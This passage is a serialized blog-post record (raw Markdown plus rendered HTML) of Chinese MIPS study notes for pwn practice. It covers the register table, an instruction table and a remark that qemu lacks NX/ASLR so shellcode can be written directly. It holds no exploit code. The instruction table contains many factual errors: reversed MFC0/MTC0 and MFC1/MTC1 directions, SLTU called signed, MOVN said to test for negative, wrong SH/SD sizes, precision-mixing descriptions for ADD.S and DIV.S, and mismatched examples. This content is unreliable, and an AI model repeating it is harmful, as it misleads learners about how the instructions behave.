一个双精度浮点数与单精度浮点数相乘加，结果为双精度                                |                  |\n| MADD.PS | 两个单精度浮点数相乘加，结果为单精度                                       |                  |\n### 系统调用号\n\n[syscall](https://syscalls.w3challs.com/)","source":"_posts/异架构/mips基础.md","raw":"---\ntitle: mips基础\ntags: \n    - mips\n    - pwn\ncategories:\n    - 学习笔记\ncover: /img/阿尼亚.png\n---\n# mips基础\n\n## 汇编\n\n### 通用寄存器\n\n| REGISTER | NAME    | USAGE                                                 |\n| -------- | ------- | ----------------------------------------------------- |\n| $0       | $zero   | 常量0(constant value 0)                                 |\n| $1       | $at     | 保留给汇编器(Reserved for assembler)                        |\n| $2-$3    | $v0-$v1 | 函数调用返回值(values for results and expression evaluation) |\n| $4-$7    | $a0-$a3 | 函数调用参数(arguments)                                     |\n| $8-$15   | $t0-$t7 | 暂时的(或随便用的)                                            |\n| $16-$23  | $s0-$s7 | 保存的(或如果用，需要SAVE/RESTORE的)(saved)                      |\n| $24-$25  | $t8-$t9 | 暂时的(或随便用的)                                            |\n| $28      | $gp     | 全局指针(Global Pointer)                                  |\n| $29      | $sp     | 堆栈指针(Stack Pointer)                                   |\n| $30      | $fp     | 帧指针(Frame Pointer)                                    |\n| $31      | $ra     | 返回地址(return address)                                  |\n\n### 指令\n\nmips 没有push 和 pop 指令。而且qemu 和硬件不支持NX、alsr，所以很多时候可以直接写shellcode。\n\n指令太多了...\n\n|         |                                                          |                  |\n| ------- | -------------------------------------------------------- | ---------------- |\n| 指令      | 功能                                                       | 应用实例             |\n| LB      | 从存储器中读取一个字节的数据到寄存器中                                      | LB R1, 0(R2)     |\n| LH      | 从存储器中读取半个字的数据到寄存器中                                       | LH R1, 0(R2)     |\n| LW      | 从存储器中读取一个字的数据到寄存器中                                       | LW R1, 0(R2)     |\n| LD      | 从存储器中读取双字的数据到寄存器中                                        | LD R1, 0(R2)     |\n| L.S     | 从存储器中读取单精度浮点数到寄存器中                                       | L.S R1, 0(R2)    |\n| L.D     | 从存储器中读取双精度浮点数到寄存器中                                       | L.D R1, 0(R2)    |\n| LBU     | 功能与LB指令相同，但读出的是不带符号的数据                                   | LBU R1, 0(R2)    |\n| LHU     | 功能与LH指令相同，但读出的是不带符号的数据                                   | LHU R1, 0(R2)    |\n| LWU     | 功能与LW指令相同，但读出的是不带符号的数据                                   | LWU R1, 0(R2)    |\n| SB      | 把一个字节的数据从寄存器存储到存储器中                                      | SB R1, 0(R2)     |\n| SH      | 把半个字节的数据从寄存器存储到存储器中                                      | SH R1，0(R2)      |\n| SW      | 把一个字的数据从寄存器存储到存储器中                                       | SW R1, 0(R2)     |\n| SD      | 把两个字节的数据从寄存器存储到存储器中                                      | SD R1, 0(R2)     |\n| S.S     | 把单精度浮点数从寄存器存储到存储器中                                       | S.S R1, 0(R2)    |\n| S.D     | 把双精度数据从存储器存储到存储器中                                        | S.D R1, 0(R2)    |\n| DADD    | 把两个定点寄存器的内容相加，也就是定点加                                     | DADD R1,R2,R3    |\n| DADDI   | 把一个寄存器的内容加上一个立即数                                         | DADDI R1,R2,#3   |\n| DADDU   | 不带符号的加                                                   | DADDU R1,R2,R3   |\n| DADDIU  | 把一个寄存器的内容加上一个无符号的立即数                                     | DADDIU R1,R2,#3  |\n| ADD.S   | 把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数                            | ADD.S F0,F1,F2   |\n| ADD.D   | 把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数                            | ADD.D F0,F1,F2   |\n| ADD.PS  | 两个单精度浮点数相加，结果是单精度浮点数                                     | ADD.PS F0,F1,F2  |\n| DSUB    | 两个寄存器的内容相减，也就是定点数的减                                      | DSUB R1,R2,R3    |\n| DSUBU   | 不带符号的减                                                   | DSUBU R1,R2,R3   |\n| SUB.S   | 一个双精度浮点数减去一个单精度浮点数，结果为单精度                                | SUB.S F1,F2,F3   |\n| SUB.D   | 一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数                             | SUB.D F1,F2,F3   |\n| SUB.PS  | 两个单精度浮点数相减                                               | SUB.SP F1,F2,F3  |\n| DDIV    | 两个定点寄存器的内容相除，也就是定点除                                      | DDIV Ｒ1,Ｒ2,Ｒ3    |\n| DDIVU   | 不带符号的除法运算                                                | DDIVU Ｒ1,Ｒ2,Ｒ3   |\n| DIV.S   | 一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数                             | DIV.S F1,F2,F3   |\n| DIV.D   | 一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数                             | DIV.D F1,F2,F3   |\n| DIV.PS  | 两个单精度浮点数相除，结果为单精度                                        | DIV.PS F1,F2,F3  |\n| DMUL    | 两个定点寄存器的内容相乘，也就是定点乘                                      | DMUL Ｒ1,Ｒ2,Ｒ3    |\n| DMULU   | 不带符号的乘法运算                                                | DMULU R1,R2,R3   |\n| MUL.S   | 一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数                             | DMUL.S F1,F2,F3  |\n| MUL.D   | 一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数                             | DMUL.D F1,F2,F3  |\n| MUL.PS  | 两个单精度浮点数相乘，结果为单精度浮点数                                     | DMUL.PS F1,F2,F3 |\n| AND     | 与运算，两个寄存器中的内容相与                                          | ANDＲ1,Ｒ2,Ｒ3      |\n| ANDI    | 一个寄存器中的内容与一个立即数相与                                        | ANDIＲ1,Ｒ2,#3     |\n| OR      | 或运算，两个寄存器中的内容相或                                          | ORＲ1,Ｒ2,Ｒ3       |\n| ORI     | 一个寄存器中的内容与一个立即数相或                                        | ORIＲ1,Ｒ2,#3      |\n| XOR     | 异或运算，两个寄存器中的内容相异或                                        | XORＲ1,Ｒ2,Ｒ3      |\n| XORI    | 一个寄存器中的内容与一个立即数异或                                        | XORIＲ1,Ｒ2,#3     |\n| BEQZ    | 条件转移指令，当寄存器中内容为0时转移发生                                    | BEQZ R1,0        |\n| BENZ    | 条件转移指令，当寄存器中内容不为0时转移发生                                   | BNEZ R1,0        |\n| BEQ     | 条件转移指令，当两个寄存器内容相等时转移发生                                   | BEQ R1,R2        |\n| BNE     | 条件转移指令，当两个寄存器中内容不等时转移发生                                  | BNE R1,R2        |\n| J       | 直接跳转指令，跳转的地址在指令中                                         | J name           |\n| JR      | 使用寄存器的跳转指令，跳转地址在寄存器中                                     | JR R1            |\n| JAL     | 直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中       | JAL R1 name      |\n| JALR    | 使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中 | JALR R1          |\n| MOV.S   | 把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器                             | MOV.S F0,F1      |\n| MOV.D   | 把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器                             | MOV.D F0,F1      |\n| MFC0    | 把一个数据从通用寄存器复制到特殊寄存器                                      | MFC0 R1,R2       |\n| MTC0    | 把一个数据从特殊寄存器复制到通用寄存器                                      | MTC0 R1,R2       |\n| MFC1    | 把一个数据从定点寄存器复制到浮点寄存器                                      | MFC1 R1,F1       |\n| MTC1    | 把一个数据从浮点寄存器复制到定点寄存器                                      | MTC1 R1,F1       |\n| LUI     | 把一个16位的立即数填入到寄存器的高16位，低16位补零                             | LUI R1,#42       |\n| DSLL    | 双字逻辑左移                                                   | DSLL R1,R2,#2    |\n| DSRL    | 双字逻辑右移                                                   | DSRL R1,R2,#2    |\n| DSRA    | 双字算术右移                                                   | DSRA R1,R2,#2    |\n| DSLLV   | 可变的双字逻辑左移                                                | DSLLV R1,R2,#2   |\n| DSRLV   | 可变的双字罗伊右移                                                | DSRLV R1,R2,#2   |\n| DSRAV   | 可变的双字算术右移                                                | DSRAV R1,R2,#2   |\n| SLT     | 如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0                         | SLT R1,R2,R3     |\n| SLTI    | 如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0                  | SLTI R1,R2,#23   |\n| SLTU    | 功能与SLT一致，但是带符号的                                          | SLTU R1,R2,R3    |\n| SLTUI   | 功能与SLT一致，但不带符号                                           | SLTUI R1,R2,R3   |\n| MOVN    | 如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器                       | MOVN R1,R2,R3    |\n| MOVZ    | 如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器                       | MOVZ R1,R2,R3    |\n| TRAP    | 根据地址向量转入管态                                               |                  |\n| ERET    | 从异常中返回到用户态                                               |                  |\n| MADD.S  | 一个双精度浮点数与单精度浮点数相乘加，结果为单精度                                |                  |\n| MADD.D  | 一个双精度浮点数与单精度浮点数相乘加，结果为双精度                                |                  |\n| MADD.PS | 两个单精度浮点数相乘加，结果为单精度                                       |                  |\n### 系统调用号\n\n[syscall](https://syscalls.w3challs.com/)","slug":"异架构/mips基础","published":1,"date":"2025-08-14T10:11:20.287Z","updated":"2025-08-14T10:13:20.703Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ip0044uomya49z0xic","content":"<h1 id=\"mips基础\"><a href=\"#mips基础\" class=\"headerlink\" title=\"mips基础\"></a>mips基础</h1><h2 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h2><h3 id=\"通用寄存器\"><a href=\"#通用寄存器\" class=\"headerlink\" title=\"通用寄存器\"></a>通用寄存器</h3><table>\n<thead>\n<tr>\n<th>REGISTER</th>\n<th>NAME</th>\n<th>USAGE</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$0</td>\n<td>$zero</td>\n<td>常量0(constant value 0)</td>\n</tr>\n<tr>\n<td>$1</td>\n<td>$at</td>\n<td>保留给汇编器(Reserved for assembler)</td>\n</tr>\n<tr>\n<td>$2-$3</td>\n<td>$v0-$v1</td>\n<td>函数调用返回值(values for results and expression evaluation)</td>\n</tr>\n<tr>\n<td>$4-$7</td>\n<td>$a0-$a3</td>\n<td>函数调用参数(arguments)</td>\n</tr>\n<tr>\n<td>$8-$15</td>\n<td>$t0-$t7</td>\n<td>暂时的(或随便用的)</td>\n</tr>\n<tr>\n<td>$16-$23</td>\n<td>$s0-$s7</td>\n<td>保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)</td>\n</tr>\n<tr>\n<td>$24-$25</td>\n<td>$t8-$t9</td>\n<td>暂时的(或随便用的)</td>\n</tr>\n<tr>\n<td>$28</td>\n<td>$gp</td>\n<td>全局指针(Global Pointer)</td>\n</tr>\n<tr>\n<td>$29</td>\n<td>$sp</td>\n<td>堆栈指针(Stack Pointer)</td>\n</tr>\n<tr>\n<td>$30</td>\n<td>$fp</td>\n<td>帧指针(Frame Pointer)</td>\n</tr>\n<tr>\n<td>$31</td>\n<td>$ra</td>\n<td>返回地址(return address)</td>\n</tr>\n</tbody></table>\n<h3 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h3><p>mips 没有push 和 pop 指令。而且qemu 和硬件不支持NX、alsr，所以很多时候可以直接写shellcode。</p>\n<p>指令太多了…</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>指令</td>\n<td>功能</td>\n<td>应用实例</td>\n</tr>\n<tr>\n<td>LB</td>\n<td>从存储器中读取一个字节的数据到寄存器中</td>\n<td>LB R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LH</td>\n<td>从存储器中读取半个字的数据到寄存器中</td>\n<td>LH R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LW</td>\n<td>从存储器中读取一个字的数据到寄存器中</td>\n<td>LW R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LD</td>\n<td>从存储器中读取双字的数据到寄存器中</td>\n<td>LD R1, 0(R2)</td>\n</tr>\n<tr>\n<td>L.S</td>\n<td>从存储器中读取单精度浮点数到寄存器中</td>\n<td>L.S R1, 0(R2)</td>\n</tr>\n<tr>\n<td>L.D</td>\n<td>从存储器中读取双精度浮点数到寄存器中</td>\n<td>L.D R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LBU</td>\n<td>功能与LB指令相同，但读出的是不带符号的数据</td>\n<td>LBU R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LHU</td>\n<td>功能与LH指令相同，但读出的是不带符号的数据</td>\n<td>LHU R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LWU</td>\n<td>功能与LW指令相同，但读出的是不带符号的数据</td>\n<td>LWU R1, 0(R2)</td>\n</tr>\n<tr>\n<td>SB</td>\n<td>把一个字节的数据从寄存器存储到存储器中</td>\n<td>SB R1, 0(R2)</td>\n</tr>\n<tr>\n<td>SH</td>\n<td>把半个字节的数据从寄存器存储到存储器中</td>\n<td>SH R1，0(R2)</td>\n</tr>\n<tr>\n<td>SW</td>\n<td>把一个字的数据从寄存器存储到存储器中</td>\n<td>SW R1, 0(R2)</td>\n</tr>\n<tr>\n<td>SD</td>\n<td>把两个字节的数据从寄存器存储到存储器中</td>\n<td>SD R1, 0(R2)</td>\n</tr>\n<tr>\n<td>S.S</td>\n<td>把单精度浮点数从寄存器存储到存储器中</td>\n<td>S.S R1, 0(R2)</td>\n</tr>\n<tr>\n<td>S.D</td>\n<td>把双精度数据从存储器存储到存储器中</td>\n<td>S.D R1, 0(R2)</td>\n</tr>\n<tr>\n<td>DADD</td>\n<td>把两个定点寄存器的内容相加，也就是定点加</td>\n<td>DADD R1,R2,R3</td>\n</tr>\n<tr>\n<td>DADDI</td>\n<td>把一个寄存器的内容加上一个立即数</td>\n<td>DADDI R1,R2,#3</td>\n</tr>\n<tr>\n<td>DADDU</td>\n<td>不带符号的加</td>\n<td>DADDU R1,R2,R3</td>\n</tr>\n<tr>\n<td>DADDIU</td>\n<td>把一个寄存器的内容加上一个无符号的立即数</td>\n<td>DADDIU R1,R2,#3</td>\n</tr>\n<tr>\n<td>ADD.S</td>\n<td>把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td>\n<td>ADD.S F0,F1,F2</td>\n</tr>\n<tr>\n<td>ADD.D</td>\n<td>把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td>\n<td>ADD.D F0,F1,F2</td>\n</tr>\n<tr>\n<td>ADD.PS</td>\n<td>两个单精度浮点数相加，结果是单精度浮点数</td>\n<td>ADD.PS F0,F1,F2</td>\n</tr>\n<tr>\n<td>DSUB</td>\n<td>两个寄存器的内容相减，也就是定点数的减</td>\n<td>DSUB R1,R2,R3</td>\n</tr>\n<tr>\n<td>DSUBU</td>\n<td>不带符号的减</td>\n<td>DSUBU R1,R2,R3</td>\n</tr>\n<tr>\n<td>SUB.S</td>\n<td>一个双精度浮点数减去一个单精度浮点数，结果为单精度</td>\n<td>SUB.S F1,F2,F3</td>\n</tr>\n<tr>\n<td>SUB.D</td>\n<td>一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td>\n<td>SUB.D F1,F2,F3</td>\n</tr>\n<tr>\n<td>SUB.PS</td>\n<td>两个单精度浮点数相减</td>\n<td>SUB.SP F1,F2,F3</td>\n</tr>\n<tr>\n<td>DDIV</td>\n<td>两个定点寄存器的内容相除，也就是定点除</td>\n<td>DDIV Ｒ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>DDIVU</td>\n<td>不带符号的除法运算</td>\n<td>DDIVU Ｒ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>DIV.S</td>\n<td>一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td>\n<td>DIV.S F1,F2,F3</td>\n</tr>\n<tr>\n<td>DIV.D</td>\n<td>一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td>\n<td>DIV.D F1,F2,F3</td>\n</tr>\n<tr>\n<td>DIV.PS</td>\n<td>两个单精度浮点数相除，结果为单精度</td>\n<td>DIV.PS F1,F2,F3</td>\n</tr>\n<tr>\n<td>DMUL</td>\n<td>两个定点寄存器的内容相乘，也就是定点乘</td>\n<td>DMUL Ｒ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>DMULU</td>\n<td>不带符号的乘法运算</td>\n<td>DMULU R1,R2,R3</td>\n</tr>\n<tr>\n<td>MUL.S</td>\n<td>一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td>\n<td>DMUL.S F1,F2,F3</td>\n</tr>\n<tr>\n<td>MUL.D</td>\n<td>一个双精度浮点数乘以一个单精度浮点数，结果为双精度浮点数</td>\n<td>DMUL.D F1,F2,F3</td>\n</tr>\n<tr>\n<td>MUL.PS</td>\n<td>两个单精度浮点数相乘，结果为单精度浮点数</td>\n<td>DMUL.PS F1,F2,F3</td>\n</tr>\n<tr>\n<td>AND</td>\n<td>与运算，两个寄存器中的内容相与</td>\n<td>ANDＲ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>ANDI</td>\n<td>一个寄存器中的内容与一个立即数相与</td>\n<td>ANDIＲ1,Ｒ2,#3</td>\n</tr>\n<tr>\n<td>OR</td>\n<td>或运算，两个寄存器中的内容相或</td>\n<td>ORＲ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>ORI</td>\n<td>一个寄存器中的内容与一个立即数相或</td>\n<td>ORIＲ1,Ｒ2,#3</td>\n</tr>\n<tr>\n<td>XOR</td>\n<td>异或运算，两个寄存器中的内容相异或</td>\n<td>XORＲ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>XORI</td>\n<td>一个寄存器中的内容与一个立即数异或</td>\n<td>XORIＲ1,Ｒ2,#3</td>\n</tr>\n<tr>\n<td>BEQZ</td>\n<td>条件转移指令，当寄存器中内容为0时转移发生</td>\n<td>BEQZ R1,0</td>\n</tr>\n<tr>\n<td>BENZ</td>\n<td>条件转移指令，当寄存器中内容不为0时转移发生</td>\n<td>BNEZ R1,0</td>\n</tr>\n<tr>\n<td>BEQ</td>\n<td>条件转移指令，当两个寄存器内容相等时转移发生</td>\n<td>BEQ R1,R2</td>\n</tr>\n<tr>\n<td>BNE</td>\n<td>条件转移指令，当两个寄存器中内容不等时转移发生</td>\n<td>BNE R1,R2</td>\n</tr>\n<tr>\n<td>J</td>\n<td>直接跳转指令，跳转的地址在指令中</td>\n<td>J name</td>\n</tr>\n<tr>\n<td>JR</td>\n<td>使用寄存器的跳转指令，跳转地址在寄存器中</td>\n<td>JR R1</td>\n</tr>\n<tr>\n<td>JAL</td>\n<td>直接跳转指令，并带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31这个寄存器中</td>\n<td>JAL R1 name</td>\n</tr>\n<tr>\n<td>JALR</td>\n<td>使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31这个寄存器中</td>\n<td>JALR R1</td>\n</tr>\n<tr>\n<td>MOV.S</td>\n<td>把一个单精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>\n<td>MOV.S F0,F1</td>\n</tr>\n<tr>\n<td>MOV.D</td>\n<td>把一个双精度浮点数从一个浮点寄存器复制到另一个浮点寄存器</td>\n<td>MOV.D F0,F1</td>\n</tr>\n<tr>\n<td>MFC0</td>\n<td>把一个数据从通用寄存器复制到特殊寄存器</td>\n<td>MFC0 R1,R2</td>\n</tr>\n<tr>\n<td>MTC0</td>\n<td>把一个数据从特殊寄存器复制到通用寄存器</td>\n<td>MTC0 R1,R2</td>\n</tr>\n<tr>\n<td>MFC1</td>\n<td>把一个数据从定点寄存器复制到浮点寄存器</td>\n<td>MFC1 R1,F1</td>\n</tr>\n<tr>\n<td>MTC1</td>\n<td>把一个数据从浮点寄存器复制到定点寄存器</td>\n<td>MTC1 R1,F1</td>\n</tr>\n<tr>\n<td>LUI</td>\n<td>把一个16位的立即数填入到寄存器的高16位，低16位补零</td>\n<td>LUI R1,#42</td>\n</tr>\n<tr>\n<td>DSLL</td>\n<td>双字逻辑左移</td>\n<td>DSLL R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRL</td>\n<td>双字逻辑右移</td>\n<td>DSRL R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRA</td>\n<td>双字算术右移</td>\n<td>DSRA R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSLLV</td>\n<td>可变的双字逻辑左移</td>\n<td>DSLLV R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRLV</td>\n<td>可变的双字罗伊右移</td>\n<td>DSRLV R1,R2,#2</td>\n</tr>\n<tr>\n<td>DSRAV</td>\n<td>可变的双字算术右移</td>\n<td>DSRAV R1,R2,#2</td>\n</tr>\n<tr>\n<td>SLT</td>\n<td>如果R2的值小于R3，那么设置R1的值为1，否则设置R1的值为0</td>\n<td>SLT R1,R2,R3</td>\n</tr>\n<tr>\n<td>SLTI</td>\n<td>如果寄存器R2的值小于立即数，那么设置R1的值为1，否则设置寄存器R1的值为0</td>\n<td>SLTI R1,R2,#23</td>\n</tr>\n<tr>\n<td>SLTU</td>\n<td>功能与SLT一致，但是带符号的</td>\n<td>SLTU R1,R2,R3</td>\n</tr>\n<tr>\n<td>SLTUI</td>\n<td>功能与SLT一致，但不带符号</td>\n<td>SLTUI R1,R2,R3</td>\n</tr>\n<tr>\n<td>MOVN</td>\n<td>如果第三个寄存器的内容为负，那么复制一个寄存器的内容到另外一个寄存器</td>\n<td>MOVN R1,R2,R3</td>\n</tr>\n<tr>\n<td>MOVZ</td>\n<td>如果第三个寄存器的内容为0，那么复制一个寄存器的内容到另外一个寄存器</td>\n<td>MOVZ R1,R2,R3</td>\n</tr>\n<tr>\n<td>TRAP</td>\n<td>根据地址向量转入管态</td>\n<td></td>\n</tr>\n<tr>\n<td>ERET</td>\n<td>从异常中返回到用户态</td>\n<td></td>\n</tr>\n<tr>\n<td>MADD.S</td>\n<td>一个双精度浮点数与单精度浮点数相乘加，结果为单精度</td>\n<td></td>\n</tr>\n<tr>\n<td>MADD.D</td>\n<td>一个双精度浮点数与单精度浮点数相乘加，结果为双精度</td>\n<td></td>\n</tr>\n<tr>\n<td>MADD.PS</td>\n<td>两个单精度浮点数相乘加，结果为单精度</td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"系统调用号\"><a href=\"#系统调用号\" class=\"headerlink\" title=\"系统调用号\"></a>系统调用号</h3><p><a href=\"https://syscalls.w3challs.com/\">syscall</a></p>\n","excerpt":"","more":"<h1 id=\"mips基础\"><a href=\"#mips基础\" class=\"headerlink\" title=\"mips基础\"></a>mips基础</h1><h2 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h2><h3 id=\"通用寄存器\"><a href=\"#通用寄存器\" class=\"headerlink\" title=\"通用寄存器\"></a>通用寄存器</h3><table>\n<thead>\n<tr>\n<th>REGISTER</th>\n<th>NAME</th>\n<th>USAGE</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>$0</td>\n<td>$zero</td>\n<td>常量0(constant value 0)</td>\n</tr>\n<tr>\n<td>$1</td>\n<td>$at</td>\n<td>保留给汇编器(Reserved for assembler)</td>\n</tr>\n<tr>\n<td>$2-$3</td>\n<td>$v0-$v1</td>\n<td>函数调用返回值(values for results and expression evaluation)</td>\n</tr>\n<tr>\n<td>$4-$7</td>\n<td>$a0-$a3</td>\n<td>函数调用参数(arguments)</td>\n</tr>\n<tr>\n<td>$8-$15</td>\n<td>$t0-$t7</td>\n<td>暂时的(或随便用的)</td>\n</tr>\n<tr>\n<td>$16-$23</td>\n<td>$s0-$s7</td>\n<td>保存的(或如果用，需要SAVE&#x2F;RESTORE的)(saved)</td>\n</tr>\n<tr>\n<td>$24-$25</td>\n<td>$t8-$t9</td>\n<td>暂时的(或随便用的)</td>\n</tr>\n<tr>\n<td>$28</td>\n<td>$gp</td>\n<td>全局指针(Global Pointer)</td>\n</tr>\n<tr>\n<td>$29</td>\n<td>$sp</td>\n<td>堆栈指针(Stack Pointer)</td>\n</tr>\n<tr>\n<td>$30</td>\n<td>$fp</td>\n<td>帧指针(Frame Pointer)</td>\n</tr>\n<tr>\n<td>$31</td>\n<td>$ra</td>\n<td>返回地址(return address)</td>\n</tr>\n</tbody></table>\n<h3 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h3><p>mips 没有push 和 pop 指令。而且qemu 和硬件不支持NX、alsr，所以很多时候可以直接写shellcode。</p>\n<p>指令太多了…</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>指令</td>\n<td>功能</td>\n<td>应用实例</td>\n</tr>\n<tr>\n<td>LB</td>\n<td>从存储器中读取一个字节的数据到寄存器中</td>\n<td>LB R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LH</td>\n<td>从存储器中读取半个字的数据到寄存器中</td>\n<td>LH R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LW</td>\n<td>从存储器中读取一个字的数据到寄存器中</td>\n<td>LW R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LD</td>\n<td>从存储器中读取双字的数据到寄存器中</td>\n<td>LD R1, 0(R2)</td>\n</tr>\n<tr>\n<td>L.S</td>\n<td>从存储器中读取单精度浮点数到寄存器中</td>\n<td>L.S R1, 0(R2)</td>\n</tr>\n<tr>\n<td>L.D</td>\n<td>从存储器中读取双精度浮点数到寄存器中</td>\n<td>L.D R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LBU</td>\n<td>功能与LB指令相同，但读出的是不带符号的数据</td>\n<td>LBU R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LHU</td>\n<td>功能与LH指令相同，但读出的是不带符号的数据</td>\n<td>LHU R1, 0(R2)</td>\n</tr>\n<tr>\n<td>LWU</td>\n<td>功能与LW指令相同，但读出的是不带符号的数据</td>\n<td>LWU R1, 0(R2)</td>\n</tr>\n<tr>\n<td>SB</td>\n<td>把一个字节的数据从寄存器存储到存储器中</td>\n<td>SB R1, 0(R2)</td>\n</tr>\n<tr>\n<td>SH</td>\n<td>把半个字节的数据从寄存器存储到存储器中</td>\n<td>SH R1，0(R2)</td>\n</tr>\n<tr>\n<td>SW</td>\n<td>把一个字的数据从寄存器存储到存储器中</td>\n<td>SW R1, 0(R2)</td>\n</tr>\n<tr>\n<td>SD</td>\n<td>把两个字节的数据从寄存器存储到存储器中</td>\n<td>SD R1, 0(R2)</td>\n</tr>\n<tr>\n<td>S.S</td>\n<td>把单精度浮点数从寄存器存储到存储器中</td>\n<td>S.S R1, 0(R2)</td>\n</tr>\n<tr>\n<td>S.D</td>\n<td>把双精度数据从存储器存储到存储器中</td>\n<td>S.D R1, 0(R2)</td>\n</tr>\n<tr>\n<td>DADD</td>\n<td>把两个定点寄存器的内容相加，也就是定点加</td>\n<td>DADD R1,R2,R3</td>\n</tr>\n<tr>\n<td>DADDI</td>\n<td>把一个寄存器的内容加上一个立即数</td>\n<td>DADDI R1,R2,#3</td>\n</tr>\n<tr>\n<td>DADDU</td>\n<td>不带符号的加</td>\n<td>DADDU R1,R2,R3</td>\n</tr>\n<tr>\n<td>DADDIU</td>\n<td>把一个寄存器的内容加上一个无符号的立即数</td>\n<td>DADDIU R1,R2,#3</td>\n</tr>\n<tr>\n<td>ADD.S</td>\n<td>把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数</td>\n<td>ADD.S F0,F1,F2</td>\n</tr>\n<tr>\n<td>ADD.D</td>\n<td>把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数</td>\n<td>ADD.D F0,F1,F2</td>\n</tr>\n<tr>\n<td>ADD.PS</td>\n<td>两个单精度浮点数相加，结果是单精度浮点数</td>\n<td>ADD.PS F0,F1,F2</td>\n</tr>\n<tr>\n<td>DSUB</td>\n<td>两个寄存器的内容相减，也就是定点数的减</td>\n<td>DSUB R1,R2,R3</td>\n</tr>\n<tr>\n<td>DSUBU</td>\n<td>不带符号的减</td>\n<td>DSUBU R1,R2,R3</td>\n</tr>\n<tr>\n<td>SUB.S</td>\n<td>一个双精度浮点数减去一个单精度浮点数，结果为单精度</td>\n<td>SUB.S F1,F2,F3</td>\n</tr>\n<tr>\n<td>SUB.D</td>\n<td>一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数</td>\n<td>SUB.D F1,F2,F3</td>\n</tr>\n<tr>\n<td>SUB.PS</td>\n<td>两个单精度浮点数相减</td>\n<td>SUB.SP F1,F2,F3</td>\n</tr>\n<tr>\n<td>DDIV</td>\n<td>两个定点寄存器的内容相除，也就是定点除</td>\n<td>DDIV Ｒ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>DDIVU</td>\n<td>不带符号的除法运算</td>\n<td>DDIVU Ｒ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>DIV.S</td>\n<td>一个双精度浮点数除以一个单精度浮点数，结果为单精度浮点数</td>\n<td>DIV.S F1,F2,F3</td>\n</tr>\n<tr>\n<td>DIV.D</td>\n<td>一个双精度浮点数除以一个单精度浮点数，结果为双精度浮点数</td>\n<td>DIV.D F1,F2,F3</td>\n</tr>\n<tr>\n<td>DIV.PS</td>\n<td>两个单精度浮点数相除，结果为单精度</td>\n<td>DIV.PS F1,F2,F3</td>\n</tr>\n<tr>\n<td>DMUL</td>\n<td>两个定点寄存器的内容相乘，也就是定点乘</td>\n<td>DMUL Ｒ1,Ｒ2,Ｒ3</td>\n</tr>\n<tr>\n<td>DMULU</td>\n<td>不带符号的乘法运算</td>\n<td>DMULU R1,R2,R3</td>\n</tr>\n<tr>\n<td>MUL.S</td>\n<td>一个双精度浮点数乘以一个单精度浮点数，结果为单精度浮点数</td>\n<td>DMUL.S 